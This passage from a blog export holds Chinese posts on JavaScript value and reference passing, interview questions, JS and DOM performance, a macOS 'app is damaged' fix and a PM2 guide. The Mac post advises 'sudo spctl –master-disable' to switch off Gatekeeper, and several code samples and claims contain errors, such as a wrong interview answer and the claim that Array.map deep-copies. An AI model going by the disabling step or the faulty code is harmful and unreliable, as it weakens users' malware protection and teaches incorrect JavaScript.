<p>如果想判断两个不同的对象是否真的相同，一个简单的方法就是将它们转换为字符串然后判断。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr1str &#x3D; JSON.stringify(arr1);</span><br><span class="line">var arr2str &#x3D; JSON.stringify(arr2);</span><br><span class="line"></span><br><span class="line">console.log(arr1str &#x3D;&#x3D;&#x3D; arr2str); &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>另一个方法就是递归地判断每一个属性的值，直到基本类型位置，然后判断是否相同。</p>
<p>###函数参数</p>
<p>当我们将基本类型数据传入函数，函数会将这些数据拷贝赋值给函数的参数变量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var hundred &#x3D; 100;</span><br><span class="line">var two &#x3D; 2;</span><br><span class="line">function multiply(x, y) &#123;</span><br><span class="line"> return x * y;</span><br><span class="line">&#125;</span><br><span class="line">var twoHundred &#x3D; multiply(hundred, two);</span><br></pre></td></tr></table></figure>

<p><code>hundred</code>的值拷贝给变量<code>x</code>，<code>two</code>的值拷贝给变量<code>y</code>。</p>
<h3 id="纯函数"><a href="#纯函数" class="headerlink" title="纯函数"></a>纯函数</h3><p>对于一个函数，给定一个输入，返回一个唯一的输出。除此之外，不会对外部环境产生任何附带影响。我们机会称该函数为纯函数。所有函数内部定义的变量在函数返回之后都被垃圾回收掉。</p>
<p>但是，如果函数的输入是对象(Array, Function, Object)，那么传入的是一个引用。对该变量的操作将会影响到原本的对象。这样的编程手法将产生附带影响，是的代码的逻辑复杂和可读性变低。</p>
<p>因此，很多数组函数，比如<code>Array.map</code>和<code>Array.filter</code>是以纯函数的形式实现。虽然它们的参数是一个数组变量，但是通过深度拷贝并赋值给一个新的变量，然后在新的数组上操作，来防止原始数组被更改。</p>
<p>我们来看一个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function changeAgeImpure(person) &#123;</span><br><span class="line"> person.age &#x3D; 25;</span><br><span class="line"> return person;</span><br><span class="line">&#125;</span><br><span class="line">var alex &#x3D; &#123;</span><br><span class="line"> name: &#39;Alex&#39;,</span><br><span class="line"> age: 30</span><br><span class="line">&#125;;</span><br><span class="line">var changedAlex &#x3D; changeAgeImpure(alex);</span><br><span class="line">console.log(alex); &#x2F;&#x2F; &#123; name: &#39;Alex&#39;, age: 25 &#125;</span><br><span class="line">console.log(changedAlex); &#x2F;&#x2F; &#123; name: &#39;Alex&#39;, age: 25 &#125;</span><br></pre></td></tr></table></figure>

<p>在非纯函数<code>changeAgeImpure</code>中，将对象<code>person</code>的<code>age</code>更新并返回。原始的<code>alex</code>对象也被影响，<code>age</code>更新为25。</p>
<p>让我们来看如何实现一个纯函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function changeAgePure(person) &#123;</span><br><span class="line"> var newPersonObj &#x3D; JSON.parse(JSON.stringify(person));</span><br><span class="line"> newPersonObj.age &#x3D; 25;</span><br><span class="line"> return newPersonObj;</span><br><span class="line">&#125;</span><br><span class="line">var alex &#x3D; &#123;</span><br><span class="line"> name: &#39;Alex&#39;,</span><br><span class="line"> age: 30</span><br><span class="line">&#125;;</span><br><span class="line">var alexChanged &#x3D; changeAgePure(alex);</span><br><span class="line">console.log(alex); &#x2F;&#x2F; &#123; name: &#39;Alex&#39;, age: 30 &#125;</span><br><span class="line">console.log(alexChanged); &#x2F;&#x2F; &#123; name: &#39;Alex&#39;, age: 25 &#125;</span><br></pre></td></tr></table></figure>
<p>我们通过<code>JSON.sringify</code>将对象变为一个字符串，然后再通过<code>JSON.parse</code>将字符串变回对象。通过该操作会生成一个新的对象。</p>
<p>###一道简单的面试题</p>
<p>值传递和引用传递经常在面试中被问到，来尝试回答一下如下代码如何输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function changeAgeAndReference(person) &#123;</span><br><span class="line"> person.age &#x3D; 25;</span><br><span class="line"> person &#x3D; &#123;</span><br><span class="line"> name: &#39;John&#39;,</span><br><span class="line"> age: 50</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> return person;</span><br><span class="line">&#125;</span><br><span class="line">var personObj1 &#x3D; &#123;</span><br><span class="line"> name: &#39;Alex&#39;,</span><br><span class="line"> age: 30</span><br><span class="line">&#125;;</span><br><span class="line">var personObj2 &#x3D; changeAgeAndReference(personObj1);</span><br><span class="line">console.log(personObj1); &#x2F;&#x2F; -&gt; ?</span><br><span class="line">console.log(personObj2); &#x2F;&#x2F; -&gt; ?</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>JavaScript面试题</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/JavaScript%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    <content><![CDATA[<h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> (function()&#123; </span><br><span class="line">        var a &#x3D; b &#x3D;5;</span><br><span class="line">    &#125;)();</span><br><span class="line">console.log(b);</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong><code>5</code></p>
<blockquote>
<p>这个问题考查的要点是两个不同的作用域，’a’被var声明成了一个局部变量，但是’b’实际上没有被定义，所以它是一个全局变量。<br>这个问题还牵扯到另个一个比较重要的问题，就是strict mode，如果你选择了strict mode，上面的代码就会报Uncaught ReferenceError，因为b没有被定义，它可以帮你检查出代码的一些问题：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> (function()&#123; </span><br><span class="line">      &#39;use strict&#39;; </span><br><span class="line">      var a &#x3D; window.b &#x3D;5;</span><br><span class="line">    &#125;)();</span><br><span class="line">console.log(b);</span><br></pre></td></tr></table></figure>
<h2 id="创建“native”方法"><a href="#创建“native”方法" class="headerlink" title="创建“native”方法"></a>创建“native”方法</h2><p>写一个重复打印字符串对象的方法，输入一个整数，这个整数代表重复打印的字数，比如：</p>
<p> console.log(‘hello’.repeatify(3));</p>
<p>这样会打印出hellohellohello。</p>
<h3 id="答案："><a href="#答案：" class="headerlink" title="答案："></a>答案：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String.prototype.repeatify &#x3D;String.prototype.repeatify ||function(times)&#123;</span><br><span class="line">    var str &#x3D;&#39;&#39;;</span><br><span class="line">    for(var i &#x3D;0; i &lt; times; i++)&#123;</span><br><span class="line">    str +&#x3D;this;</span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
<p>这个问题考查的是开发者对JavaScript继承和prototype属性的了解程度。</p>
<h2 id="Hoisting"><a href="#Hoisting" class="headerlink" title="Hoisting"></a>Hoisting</h2><p>下面这段代码的输出结果是什么？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function test()&#123;</span><br><span class="line">   console.log(a);</span><br><span class="line">   console.log(foo()); var a &#x3D;1; function foo()&#123;</span><br><span class="line">   return2;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   test();</span><br></pre></td></tr></table></figure>
<p><strong>答案:</strong><code>undefined和2</code></p>
<p>上面的代码和下面这段是等效的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function test()&#123; var a; function foo()&#123;</span><br><span class="line">    return2;</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(a);</span><br><span class="line">    console.log(foo());</span><br><span class="line">    a &#x3D;1;</span><br><span class="line">    &#125;</span><br><span class="line">    test();</span><br></pre></td></tr></table></figure>
<h2 id="在JavaScript中如何执行"><a href="#在JavaScript中如何执行" class="headerlink" title="在JavaScript中如何执行"></a>在JavaScript中如何执行</h2><p>通过下面的代码给出结果，解释一下你的答案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj &#x3D;&#123;</span><br><span class="line">    fullname:&#39;Colin Ihrig&#39;,</span><br><span class="line">    prop:&#123;</span><br><span class="line">          fullname:&#39;Aurelio De Rosa&#39;,</span><br><span class="line">          getFullname:function()&#123;</span><br><span class="line">                  return this.fullname;</span><br><span class="line">           &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">console.log(obj.prop.getFullname()); var test &#x3D; obj.prop.getFullname;</span><br><span class="line">console.log(test());</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong><code>Aurelio De Rosa 和John Doe</code></p>
<h2 id="call-和-apply"><a href="#call-和-apply" class="headerlink" title="call() 和 apply()"></a>call() 和 apply()</h2><p>解决前面的问题之后让最后一个console.log()输出Aurelio De Rosa.</p>
<p><strong>答案：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(test.call(obj.prop));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这个问题在于call()还是apply()。 </p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Javascript自身执行效率</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Javascript%E8%87%AA%E8%BA%AB%E6%89%A7%E8%A1%8C%E6%95%88%E7%8E%87/</url>
    <content><![CDATA[<p>Javascript中的作用域链、闭包、原型继承、eval等特性，在提供各种神奇功能的同时也带来了各种效率问题，用之不慎就会导致执行效率低下。</p>
<h2 id="1、全局导入"><a href="#1、全局导入" class="headerlink" title="1、全局导入"></a>1、全局导入</h2><p>我们在编码过程中多多少少会使用到一些全局变量（window,document,自定义全局变量等等），了解javascript作用域链的人都知道，在局部作用域中访问全局变量需要一层一层遍历整个作用域链直至顶级作用域，而局部变量的访问效率则会更快更高，因此在局部作用域中高频率使用一些全局对象时可以将其导入到局部作用域中，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &#x2F;&#x2F;1、作为参数传入模块</span><br><span class="line">  (function(window,$)&#123;</span><br><span class="line">      var xxx &#x3D; window.xxx;</span><br><span class="line">      $(&quot;#xxx1&quot;).xxx();</span><br><span class="line">      $(&quot;#xxx2&quot;).xxx();</span><br><span class="line">  &#125;)(window,jQuery);</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F;2、暂存到局部变量</span><br><span class="line">  function()&#123;</span><br><span class="line">     var doc &#x3D; document;</span><br><span class="line">     var global &#x3D; window.global;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2、eval以及类eval问题"><a href="#2、eval以及类eval问题" class="headerlink" title="2、eval以及类eval问题"></a>2、eval以及类eval问题</h2><p>我们都知道eval可以将一段字符串当做js代码来执行处理，据说使用eval执行的代码比不使用eval的代码慢100倍以上（具体效率我没有测试，有兴趣同学可以测试一下）</p>
<p>JavaScript 代码在执行前会进行类似“预编译”的操作：首先会创建一个当前执行环境下的活动对象，并将那些用 var 申明的变量设置为活动对象的属性，但是此时这些变量的赋值都是 undefined，并将那些以 function 定义的函数也添加为活动对象的属性，而且它们的值正是函数的定义。但是，如果你使用了“eval”，则“eval”中的代码（实际上为字符串）无法预先识别其上下文，无法被提前解析和优化，即无法进行预编译的操作。所以，其性能也会大幅度降低</p>
<p>其实现在大家一般都很少会用eval了，这里我想说的是两个类eval的场景</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(new Function&#123;&#125;,setTimeout,setInterver)</span><br><span class="line"></span><br><span class="line">setTimtout(&quot;alert(1)&quot;,1000);</span><br><span class="line"></span><br><span class="line">setInterver(&quot;alert(1)&quot;,1000);</span><br><span class="line"></span><br><span class="line">(new Function(&quot;alert(1)&quot;))();</span><br></pre></td></tr></table></figure>
<p>上述几种类型代码执行效率都会比较低，因此建议直接传入匿名方法、或者方法的引用给setTimeout方法</p>
<h2 id="3、闭包结束后释放掉不再被引用的变量"><a href="#3、闭包结束后释放掉不再被引用的变量" class="headerlink" title="3、闭包结束后释放掉不再被引用的变量"></a>3、闭包结束后释放掉不再被引用的变量</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var f &#x3D; (function()&#123;</span><br><span class="line">    var a &#x3D; &#123;name:&quot;var3&quot;&#125;;</span><br><span class="line">    var b &#x3D; [&quot;var1&quot;,&quot;var2&quot;];</span><br><span class="line">    var c &#x3D; document.getElementByTagName(&quot;li&quot;);</span><br><span class="line">    &#x2F;&#x2F;****其它变量</span><br><span class="line">    &#x2F;&#x2F;***一些运算</span><br><span class="line">    var res &#x3D; function()&#123;</span><br><span class="line">        alert(a.name);</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<p>上述代码中变量f的返回值是由一个立即执行函数构成的闭包中返回的方法res，该变量保留了对于这个闭包中所有变量（a,b,c等）的引用，因此这两个变量会一直驻留在内存空间中,尤其是对于dom元素的引用对内存的消耗会很大，而我们在res中只使用到了a变量的值，因此，在闭包返回前我们可以将其它变量释放</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var f &#x3D; (function()&#123;</span><br><span class="line">    var a &#x3D; &#123;name:&quot;var3&quot;&#125;;</span><br><span class="line">    var b &#x3D; [&quot;var1&quot;,&quot;var2&quot;];</span><br><span class="line">    var c &#x3D; document.getElementByTagName(&quot;li&quot;);</span><br><span class="line">    &#x2F;&#x2F;****其它变量</span><br><span class="line">    &#x2F;&#x2F;***一些运算</span><br><span class="line">    &#x2F;&#x2F;闭包返回前释放掉不再使用的变量</span><br><span class="line">    b &#x3D; c &#x3D; null;</span><br><span class="line">    var res &#x3D; function()&#123;</span><br><span class="line">        alert(a.name);</span><br><span class="line">        &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Js操作dom的效率</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Js%E6%93%8D%E4%BD%9Cdom%E7%9A%84%E6%95%88%E7%8E%87/</url>
    <content><![CDATA[<p>在web开发过程中，前端执行效率的瓶颈往往都是在dom操作上面，dom操作是一件很耗性能的事情，如何才能在dom操作过程中尽量节约性能呢？</p>
<p><strong>1、减少reflow</strong></p>
<p><strong>什么是reflow？</strong></p>
<p>当 DOM 元素的属性发生变化 (如 color) 时, 浏览器会通知 render 重新描绘相应的元素, 此过程称为 repaint。</p>
<p>如果该次变化涉及元素布局 (如 width), 浏览器则抛弃原有属性, 重新计算并把结果传递给 render 以重新描绘页面元素, 此过程称为 reflow。</p>
<p><strong>减少reflow的方法</strong></p>
<ol>
<li> 先将元素从document中删除，完成修改后再把元素放回原来的位置（当对某元素及其子元素进行大量reflow操作时，1,2两种方法效果才会比较明显）</li>
<li> 将元素的display设置为”none”，完成修改后再把display修改为原来的值</li>
<li> 修改多个样式属性时定义class类代替多次修改style属性（for certain同学推荐）</li>
<li> 大量添加元素到页面时使用documentFragment</li>
</ol>
<p>例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(var i&#x3D;0;i&lt;100:i++)&#123;</span><br><span class="line">    var child &#x3D; docuemnt.createElement(&quot;li&quot;);</span><br><span class="line">    child.innerHtml &#x3D; &quot;child&quot;;</span><br><span class="line">    document.getElementById(&quot;parent&quot;).appendChild(child);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码会多次操作dom，效率比较低，可以改为下面的形式 创建documentFragment，将所有元素加入到docuemntFragment不会改变dom结构，最后将其添加到页面，只进行了一次reflow</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var frag &#x3D; document.createDocumentFragment();</span><br><span class="line">for(var i&#x3D;0;i&lt;100:i++)&#123;</span><br><span class="line">        var child &#x3D; docuemnt.createElement(&quot;li&quot;);</span><br><span class="line">        child.innerHtml &#x3D; &quot;child&quot;;</span><br><span class="line">    frag.appendChild(child);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;parent&quot;).appendChild(frag);</span><br></pre></td></tr></table></figure>

<p><strong>2、暂存dom状态信息</strong></p>
<p>当代码中需要多次访问元素的状态信息，在状态不变的情况下我们可以将其暂存到变量中，这样可以避免多次访问dom带来内存的开销，典型的例子就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ar lis &#x3D; document.getElementByTagName(&quot;li&quot;);</span><br><span class="line">for(var i&#x3D;1;i&lt;lis.length;i++)&#123;</span><br><span class="line">    &#x2F;&#x2F;***</span><br><span class="line">&#125;</span><br><span class="line">上述方式会在每一次循环都去访问dom元素，我们可以简单将代码优化如下</span><br><span class="line">var lis &#x3D; document.getElementByTagName(&quot;li&quot;);</span><br><span class="line">for(var i&#x3D;1,j&#x3D;lis.length ;i&lt;j;i++)&#123;</span><br><span class="line">    &#x2F;&#x2F;***</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3、缩小选择器的查找范围</strong></p>
<p>查找dom元素时尽量避免大面积遍历页面元素，尽量使用精准选择器，或者指定上下文以缩小查找范围，以jquery为例</p>
<ul>
<li>  少用模糊匹配的选择器：例如$(“[name*=’_fix’]”)，多用诸如id以及逐步缩小范围的复合选择器$(“li.active”)等</li>
<li>  指定上下文：例如$(“#parent .class”)，$(“.class”,$el)等</li>
</ul>
<p><strong>4、使用事件委托</strong></p>
<p><strong>使用场景：</strong>一个有大量记录的列表，每条记录都需要绑定点击事件，在鼠标点击后实现某些功能，我们通常的做法是给每条记录都绑定监听事件，这种做法会导致页面会有大量的事件监听器，效率比较低下。</p>
<p><strong>基本原理</strong>：我们都知道dom规范中事件是会冒泡的，也就是说在不主动阻止事件冒泡的情况下任何一个元素的事件都会按照dom树的结构逐级冒泡至顶端。而event对象中也提供了event.target（IE下是srcElement）指向事件源，因此我们即使在父级元素上监听该事件也可以找到触发该事件的最原始的元素，这就是委托的基本原理。废话不多说，上示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(&quot;ul li&quot;).bind(&quot;click&quot;,function()&#123;</span><br><span class="line">    alert($(this).attr(&quot;data&quot;));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>上述写法其实是给所有的li元素都绑定了click事件来监听鼠标点击每一个元素的事件，这样页面上会有大量的事件监听器。</p>
<p>根据上面介绍的监听事件的原理我们来改写一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(&quot;ul&quot;).bind(&quot;click&quot;,function(e)&#123;</span><br><span class="line">    if(e.target.nodeName.toLowerCase() &#x3D;&#x3D;&#x3D;&quot;li&quot;)&#123;</span><br><span class="line">        alert($(e.target).attr(&quot;data&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这样一来，我们就可以只添加一个事件监听器去捕获所有li上触发的事件，并做出相应的操作。</p>
<p>当然，我们不必每次都做事件源的判断工作，可以将其抽象一下交给工具类来完成。jquery中的delegate()方法就实现了该功能</p>
<p>语法是这样的$(selector).delegate(childSelector,event,data,function)，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(&quot;div&quot;).delegate(&quot;button&quot;,&quot;click&quot;,function()&#123;</span><br><span class="line">  $(&quot;p&quot;).slideToggle();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>参数说明（引自w3school）</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d8f6aee706ebe272.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="Javascript执行效率小结_"></p>
<p>**Tips:**事件委托还有一个好处就是，即使在事件绑定之后动态添加的元素上触发的事件同样可以监听到哦，这样就不用在每次动态加入元素到页面后都为其绑定事件了</p>
<p>暂时先总结到这。</p>
<hr>
<p>原文来自：<a href="http://www.cnblogs.com/gewei/archive/2013/03/29/2988180.html">www.cnblogs.com/gewei/archive/2013/03/29/2988180.html</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Mac应用程序无法打开或文件损坏的处理方法</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Mac%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E6%88%96%E6%96%87%E4%BB%B6%E6%8D%9F%E5%9D%8F%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Mac应用程序无法打开或文件损坏的处理方法</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>大多数用户在安装 Mac 应用时，经常会遇到提示 “ XXX.app 已损坏，打不开。您应该将它移到废纸篓 ” 或 “ 打不开 XXX.app，因为它来自身份不明的开发者 ” ，如下图所示：</p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-acb847a54e1d04dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="1516261454857950.png"></p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-6dc056c4a2b86b69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="1516261464940638.png"></p>
<p>  遇到这种情况，解决的方法很简单，步骤如下：</p>
<p><strong>1. 打开系统偏好设置界面，进入安全性与隐私</strong></p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-11dc656bdb44769d.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="屏幕快照 2018-01-18 下午2.54.11.jpg" title="1516261331253960.jpeg"></p>
<p><strong>2. 点按左下角的锁头图标，解锁更改权限</strong></p>
<p><strong>3. 将允许从以下位置下载的应用，更改为 “ 任何来源 ” ，然后再打开应用即可</strong></p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-d9101881c093b84a.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="1516261394740817.jpeg"></p>
<p>若没有“任何来源”这个选项（macOS Sierra 10.12及以上的用户可能会遇到），按以下步骤执行：</p>
<p>打开终端（Terminal.app）</p>
<p>拷贝粘贴 sudo spctl –master-disable，按回车键</p>
<p>输入你的账户密码，按回车键确认执行（该密码不会显示，直接输入即可）</p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-0b13724e32c58228.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>如安装应用时，出现 “ 打不开 XXX.app，因为它来自身份不明的开发者 ” ，并提示你的软件在什么位置什么时间下载了磁盘影像。如图所示：</p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-f6ffe536b22e1916.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="1522042275384344.png"></p>
<p>  遇到这种情况，方法如下：</p>
<p><strong>1、将软件放入“应用程序”后，点击软件 右键-打开 ，如图所示：</strong></p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-8a9f9c4ab31e0aeb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="1522044010422080.png"></p>
<p><strong>2、弹出以下对话框后，你打开即可。</strong></p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-1f7894dba90e9353.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="1522043712276473.png"></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Node进程管理器PM2</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Node%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E5%99%A8PM2/</url>
    <content><![CDATA[<p><code>PM2</code>是一个带有<strong>负载均衡</strong>功能的<code>Node</code>应用的进程管理器。<code>PM2</code>可以利用服务器上的<strong>所有CPU</strong>，并保证进程永远都活着，<strong>0秒的重载</strong>，部署管理<strong>多个</strong>Node项目。<code>PM2</code>是<code>Node</code>线上部署完美的管理工具。</p>
<h4 id="1、基本指令"><a href="#1、基本指令" class="headerlink" title="1、基本指令"></a>1、基本指令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install pm2 -g ： 全局安装。</span><br><span class="line"></span><br><span class="line">pm2 start app.js ： 启动服务，入口文件是app.js。</span><br><span class="line"></span><br><span class="line">pm2 start app.js -i [n] --name [name] ： 启动n个进程，名字命名为name。</span><br><span class="line"></span><br><span class="line">npm restart  [name or id] ： 重启服务。</span><br><span class="line"></span><br><span class="line">npm reload  [name or id] ： 和rastart功能相同，但是可以实现0s的无缝衔接；如果有nginx的使用经验，可以</span><br><span class="line">对比nginx reload指令。</span><br><span class="line"></span><br><span class="line">pm2 start app.js --max_memory_restart 1024M ： 当内存超过1024M时自动重启。 如果工程中有比较棘手的内</span><br><span class="line">存泄露问题，这个算是一个折中方案。</span><br><span class="line"></span><br><span class="line">pm2 monit ： 对服务进行监控。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2、查看服务进程数"><a href="#2、查看服务进程数" class="headerlink" title="2、查看服务进程数"></a>2、查看服务进程数</h4><p>至于要启动几个进程，可以通过服务器的内核数进行确定，几个内核就启动几个服务。指令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看物理CPU个数</span><br><span class="line"> cat &#x2F;proc&#x2F;cpuinfo| grep &quot;physical id&quot; | sort| uniq | wc -l</span><br><span class="line"></span><br><span class="line"> # 查看每个物理CPU中core的个数(即核数)</span><br><span class="line"> cat &#x2F;proc&#x2F;cpuinfo| grep &quot;cpu cores&quot;| uniq</span><br><span class="line"></span><br><span class="line"> # 查看逻辑CPU的个数</span><br><span class="line"> cat &#x2F;proc&#x2F;cpuinfo| grep &quot;processor&quot;| wc -l</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当然可以启动多个端口，一个端口号对应一个服务，这样的话就需要nignx来做负载均衡了。</p>
<h4 id="3、-是否需要nginx"><a href="#3、-是否需要nginx" class="headerlink" title="3、 是否需要nginx"></a>3、 是否需要nginx</h4><p>nginx可以做的事情主要有两个：</p>
<blockquote>
<ol>
<li> 反向代理，实现简单的负载均衡： 如果有多台服务器或者一台服务器多个端口，可以考虑用nginx。</li>
<li> 静态资源缓存：把一些静态资源（如静态页面，js等资源文件）放到nginx里，可以极大的提高服务的性能。</li>
</ol>
</blockquote>
<h4 id="4、fork与cluster启动模式"><a href="#4、fork与cluster启动模式" class="headerlink" title="4、fork与cluster启动模式"></a>4、fork与cluster启动模式</h4><p>开发环境中多以fork的方式启动，生产环境中多用cluster方式启动</p>
<p><a href="https://camo.githubusercontent.com/73722a2868ba4cfad76e1e57a6ae2dd06e512e04/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f616534396261353767793166646f7a7134333167616a32316630303963373730"><img src="http://upload-images.jianshu.io/upload_images/10024246-dbf8192d633005bd?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a> </p>
<p>上面的示例图中可以看一“watching”一项，这个项默认是disabled，可以通过如下命令开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pm2 start app.js --name m --watch</span><br></pre></td></tr></table></figure>

<p><strong>建议：这个适合在开发时用，可以省不少时间，生产环境下最好不要用</strong></p>
<ol>
<li><p> cluster是fork的派生，cluster支持所有cluster拥有的特性；</p>
</li>
<li><p> fork不支持socket地址端口复用，cluster支持地址端口复用。因为只有node的cluster模块支持socket选项SO_REUSEADDR；</p>
</li>
</ol>
<p><code>fork不可以启动多个实例进程，cluster可以启动多个实例。但node的child_process.fork是可以实现启动多个进程的，但是为什么没有实现呢？就个人理解，node多为提供网络服务，启动多个实例需要地址端口复用，此时便可使用cluster模式实现，但fork模式并不支持地址端口复用，多实例进程启动会产生异常错误。但对于常驻任务脚本而言，不需要提供网络服务，此时多进程启动可以实现，同时也提高了任务处理效率。对于上述需求，可以两种方式实现，一是配置app0,app1,app2方式启动多个进程，二是通过应用实例自身调用child_process.fork多进程编程实现；</code></p>
<p>fork模式可以应用于其他语言，如php，python，perl，ruby，bash，coffee， 而cluster只能应用于node;</p>
<p>fork不支持定时重启，cluster支持定时重启。定时重启也就是配置中的cron_restart配置项。</p>
<h4 id="5、pm2的监控"><a href="#5、pm2的监控" class="headerlink" title="5、pm2的监控"></a>5、pm2的监控</h4><p>pm2的监控有两种方式：</p>
<h5 id="①cli方式监控"><a href="#①cli方式监控" class="headerlink" title="①cli方式监控"></a>①cli方式监控</h5><p>pm2 monit是专门用来监控的命令，监控项包括cpu与内存</p>
<p><a href="https://camo.githubusercontent.com/26aaca8e82f519f00ecf5800ac232430364d3736/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f616534396261353767793166646f7a7876773475356a32316b77306470343161"><img src="http://upload-images.jianshu.io/upload_images/10024246-f1ba4e586096426d?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a> </p>
<p>缺点monit展示内容太过粗糙，不够详细</p>
<h5 id="②pm2-list展示当前所有pm2的管理项目"><a href="#②pm2-list展示当前所有pm2的管理项目" class="headerlink" title="②pm2 list展示当前所有pm2的管理项目"></a>②pm2 list展示当前所有pm2的管理项目</h5><p><a href="https://camo.githubusercontent.com/ced3e54eb50b8cdfad838f6114d1661f292ae735/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f6165343962613537677931666470303061377177306a32316663306361677035"><img src="http://upload-images.jianshu.io/upload_images/10024246-15f8e419621a2c5b?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a> </p>
<p>可以查看出每个进程的运行状态。</p>
<p>如果需要更详细的监控内容，对于cli而言一般都是可以实现的。</p>
<p>这种监控方式的缺点：</p>
<blockquote>
<p>a. 不够直观，需要自己去执行命令并分析结果；</p>
</blockquote>
<blockquote>
<p>b. 不便于多台服务器的应用监控管理；</p>
</blockquote>
